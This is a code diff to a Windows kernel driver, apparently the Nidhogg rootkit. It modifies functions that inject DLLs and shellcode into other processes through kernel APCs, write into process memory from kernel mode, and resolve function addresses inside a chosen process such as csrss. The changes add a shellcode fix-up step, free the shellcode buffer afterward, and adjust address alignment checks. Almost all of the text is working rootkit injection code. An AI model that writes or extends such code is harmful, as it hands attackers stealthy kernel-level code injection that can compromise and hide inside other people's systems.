@@ -70,7 +70,7 @@ NTSTATUS MemoryUtils::InjectDllAPC(DllInformation* DllInfo) {
 	ShellcodeInformation ShellcodeInfo{};
 	PVOID shellcode = NULL;
 
-	NTSTATUS status = PrepareShellcode(ZwCurrentProcess(), PsGetCurrentProcess(), DllInfo->DllPath, &shellcode);
+	NTSTATUS status = PrepareShellcode(DllInfo->DllPath, &shellcode, DllInfo->Pid);
 
 	if (!NT_SUCCESS(status))
 		return status;
@@ -81,9 +81,11 @@ NTSTATUS MemoryUtils::InjectDllAPC(DllInformation* DllInfo) {
 	ShellcodeInfo.Parameter3 = NULL;
 	ShellcodeInfo.Pid = DllInfo->Pid;
 	ShellcodeInfo.Shellcode = shellcode;
-	ShellcodeInfo.ShellcodeSize = DLL_INJ_SHELLCODE_SIZE;
+	ShellcodeInfo.ShellcodeSize = SHELLCODE_SIZE;
 
-	status = InjectShellcodeAPC(&ShellcodeInfo);
+	status = InjectShellcodeAPC(&ShellcodeInfo, true);
+	SIZE_T shellcodeSize = SHELLCODE_SIZE;
+	ZwFreeVirtualMemory(ZwCurrentProcess(), &shellcode, &shellcodeSize, MEM_DECOMMIT);
 	return status;
 }
 
@@ -189,7 +191,7 @@ NTSTATUS MemoryUtils::InjectDllThread(DllInformation* DllInfo) {
 * Returns:
 * @status		 [NTSTATUS]				 -- Whether successfuly injected or not.
 */
-NTSTATUS MemoryUtils::InjectShellcodeAPC(ShellcodeInformation* ShellcodeInfo) {
+NTSTATUS MemoryUtils::InjectShellcodeAPC(ShellcodeInformation* ShellcodeInfo, bool injectedDll) {
 	OBJECT_ATTRIBUTES objAttr{};
 	CLIENT_ID cid{};
 	HANDLE hProcess = NULL;
@@ -206,6 +208,9 @@ NTSTATUS MemoryUtils::InjectShellcodeAPC(ShellcodeInformation* ShellcodeInfo) {
 
 	if (!NT_SUCCESS(status))
 		return status;
+
+	if (!ShellcodeInfo->Shellcode || shellcodeSize == 0)
+		return STATUS_INVALID_PARAMETER;
 
 	// Find APC suitable thread.
 	status = FindAlertableThread(pid, &TargetThread);
@@ -237,6 +242,13 @@ NTSTATUS MemoryUtils::InjectShellcodeAPC(ShellcodeInformation* ShellcodeInfo) {
 
 		if (!NT_SUCCESS(status))
 			break;
+
+		if (injectedDll) {
+			status = FixShellcode(shellcodeAddress, TargetProcess);
+
+			if (!NT_SUCCESS(status))
+				break;
+		}
 
 		// Create and execute the APCs.
 		ShellcodeApc = (PKAPC)AllocateMemory(sizeof(KAPC), false);
@@ -928,31 +940,35 @@ NTSTATUS MemoryUtils::GetDesKey(DesKeyInformation* DesKey) {
 * @targetAddress	 [PVOID]	 -- Target address to write.
 * @dataSize			 [SIZE_T]	 -- Size of data to write.
 * @mode			     [MODE]		 -- Mode of the request (UserMode or KernelMode allowed).
+* @alignAddr		 [bool]		 -- Whether to align the address or not.
 *
 * Returns:
 * @status			 [NTSTATUS]	 -- Whether successfuly written or not.
 */
-NTSTATUS MemoryUtils::KeWriteProcessMemory(PVOID sourceDataAddress, PEPROCESS TargetProcess, PVOID targetAddress, SIZE_T dataSize, MODE mode) {
+NTSTATUS MemoryUtils::KeWriteProcessMemory(PVOID sourceDataAddress, PEPROCESS TargetProcess, PVOID targetAddress, 
+	SIZE_T dataSize, MODE mode, bool alignAddr) {
 	HANDLE hTargetProcess;
 	ULONG oldProtection;
 	SIZE_T patchLen;
 	SIZE_T bytesWritten;
 	NTSTATUS status = STATUS_SUCCESS;
+	SIZE_T alignment = alignAddr ? dataSize : 1;
 
 	if (mode != KernelMode && mode != UserMode)
 		return STATUS_UNSUCCESSFUL;
 
 	// Making sure that the given kernel mode address is valid.
-	if (mode == KernelMode && (!VALID_KERNELMODE_MEMORY((DWORD64)sourceDataAddress) || 
+	if (mode == KernelMode && (!VALID_KERNELMODE_MEMORY((DWORD64)sourceDataAddress) ||
 		(!VALID_KERNELMODE_MEMORY((DWORD64)targetAddress) &&
-		!NT_SUCCESS(ProbeAddress(targetAddress, dataSize, dataSize, STATUS_UNSUCCESSFUL))))) {
+			!NT_SUCCESS(ProbeAddress(targetAddress, dataSize, alignment, STATUS_UNSUCCESSFUL))))) {
 		status = STATUS_UNSUCCESSFUL;
 		return status;
 	}
+
 	else if (mode == UserMode && (
-		!NT_SUCCESS(ProbeAddress(sourceDataAddress, dataSize, dataSize, STATUS_UNSUCCESSFUL)) || 
+		!NT_SUCCESS(ProbeAddress(sourceDataAddress, dataSize, dataSize, STATUS_UNSUCCESSFUL)) ||
 		(!VALID_KERNELMODE_MEMORY((DWORD64)targetAddress) &&
-		!NT_SUCCESS(ProbeAddress(targetAddress, dataSize, dataSize, STATUS_UNSUCCESSFUL))))) {
+			!NT_SUCCESS(ProbeAddress(targetAddress, dataSize, alignment, STATUS_UNSUCCESSFUL))))) {
 		status = STATUS_UNSUCCESSFUL;
 		return status;
 	}
@@ -1310,21 +1326,26 @@ PVOID MemoryUtils::GetSSDTFunctionAddress(CHAR* functionName) {
 * Parameters:
 * @functionName [CHAR*]	   -- Function name to search.
 * @moduleName   [WCHAR*]   -- Module's name to search.
+* @pid 			[ULONG]	   -- Process id to search in.
 *
 * Returns:
 * @status		[NTSTATUS] -- STATUS_SUCCESS if found, else error.
 */
-PVOID MemoryUtils::GetFuncAddress(CHAR* functionName, WCHAR* moduleName) {
+PVOID MemoryUtils::GetFuncAddress(CHAR* functionName, WCHAR* moduleName, ULONG pid) {
+	NTSTATUS status;
 	KAPC_STATE state;
 	PEPROCESS CsrssProcess = NULL;
 	PVOID functionAddress = NULL;
-	ULONG csrssPid = 0;
-	NTSTATUS status = NidhoggProccessUtils->FindPidByName(L"csrss.exe", &csrssPid);
+	ULONG searchedPid = pid;
 
-	if (!NT_SUCCESS(status))
-		return functionAddress;
+	if (searchedPid == 0) {
+		status = NidhoggProccessUtils->FindPidByName(L"csrss.exe", &searchedPid);
 
-	status = PsLookupProcessByProcessId(ULongToHandle(csrssPid), &CsrssProcess);
+		if (!NT_SUCCESS(status))
+			return functionAddress;
+	}
+
+	status = PsLookupProcessByProcessId(ULongToHandle(searchedPid), &CsrssProcess);
 
 	if (!NT_SUCCESS(status))
 		return functionAddress;
